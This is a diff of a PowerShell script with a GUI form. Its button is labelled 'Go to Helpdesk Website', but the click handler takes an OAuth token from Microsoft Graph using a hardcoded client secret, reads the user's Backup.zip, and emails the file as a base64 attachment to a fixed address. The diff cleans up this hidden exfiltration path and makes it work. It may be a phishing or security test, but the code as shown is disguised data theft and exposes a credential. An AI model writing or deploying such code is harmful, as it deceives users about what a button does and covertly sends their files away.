@@ -66,60 +66,61 @@ $button.Text = "Go to Helpdesk Website"
 $button.Size = New-Object System.Drawing.Size(200,30)
 $button.Location = New-Object System.Drawing.Point(20, 180)
 $button.Add_Click({
-# Variables
-$tenantId    = "aff8a746-8efb-4a47-879d-9b13c505ea01"
-$clientId    = "901c8ca6-c038-4a84-805f-77b1863aecca"
-$clientSecret= "~5V8Q~_LVkiDCMfDOoHkaQ-_Yezuw3meW5T0pb5g"
-$scope       = "https://graph.microsoft.com/.default"
-$tokenUrl    = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
+    # Variables
+    $tenantId    = "aff8a746-8efb-4a47-879d-9b13c505ea01"
+    $clientId    = "901c8ca6-c038-4a84-805f-77b1863aecca"
+    $clientSecret= "~5V8Q~_LVkiDCMfDOoHkaQ-_Yezuw3meW5T0pb5g"
+    $scope       = "https://graph.microsoft.com/.default"
+    $tokenUrl    = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
 
-# Get OAuth token
-$body = @{
-    client_id     = $clientId
-    scope         = $scope
-    client_secret = $clientSecret
-    grant_type    = "client_credentials"
-}
-
-$tokenResponse = Invoke-RestMethod -Uri $tokenUrl -Method POST -Body $body
-$token = $tokenResponse.access_token
-
-# Prepare email
-$recipient = "mfisher@netsmartinc.com"
-$subject   = "Security Concerns"
-$bodyText  = "Hello Security Team, please address the attached potential issue found."
-$filePath  = "C:\Users\$env:USERNAME\Backup.zip"
-
-# Read file and convert to Base64
-$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
-$fileBase64 = [System.Convert]::ToBase64String($fileBytes)
-$fileName = [System.IO.Path]::GetFileName($filePath)
-
-# Email payload
-$emailPayload = @{
-    message = @{
-        subject = $subject
-        body = @{
-            contentType = "Text"
-            content     = $bodyText
-        }
-        toRecipients = @(@{ emailAddress = @{ address = $recipient } })
-        attachments = @(@{
-            "@odata.type" = "#microsoft.graph.fileAttachment"
-            name          = $fileName
-            contentBytes  = $fileBase64
-        })
+    # Get OAuth token
+    $body = @{
+        client_id     = $clientId
+        scope         = $scope
+        client_secret = $clientSecret
+        grant_type    = "client_credentials"
     }
-    saveToSentItems = $true
-} | ConvertTo-Json -Depth 10
 
-# Send email
-$headers = @{
-    Authorization = "Bearer $token"
-    Content-Type  = "application/json"
-}
+    $tokenResponse = Invoke-RestMethod -Uri $tokenUrl -Method POST -Body $body
+    $token = $tokenResponse.access_token
 
-Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users/$Recipient/sendMail" -Headers $Headers -Method POST -Body $EmailPayload
+    # Prepare email
+    $senderMailbox = "maxtest@netsmartinc.com"
+    $recipient = "mfisher@netsmartinc.com"
+    $subject   = "Security Concerns"
+    $bodyText  = "Hello Security Team, please address the attached potential issue found."
+    $filePath  = "C:\Users\$env:USERNAME\Backup.zip"
+
+    # Read file and convert to Base64
+    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+    $fileBase64 = [System.Convert]::ToBase64String($fileBytes)
+    $fileName = [System.IO.Path]::GetFileName($filePath)
+
+    # Email payload
+    $emailPayload = @{
+        message = @{
+            subject = $subject
+            body = @{
+                contentType = "Text"
+                content     = $bodyText
+            }
+            toRecipients = @(@{ emailAddress = @{ address = $recipient } })
+            attachments = @(@{
+                "@odata.type" = "#microsoft.graph.fileAttachment"
+                name          = $fileName
+                contentBytes  = $fileBase64
+            })
+        }
+        saveToSentItems = $true
+    } | ConvertTo-Json -Depth 10
+
+    # Send email
+    $headers = @{
+        "Authorization" = "Bearer $token"
+        "Content-Type"  = "application/json"
+    }
+
+    Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users/$senderMailbox/sendMail" -Headers $headers -Method POST -Body $EmailPayload
     $form.Close()
 })
 $form.Controls.Add($button)
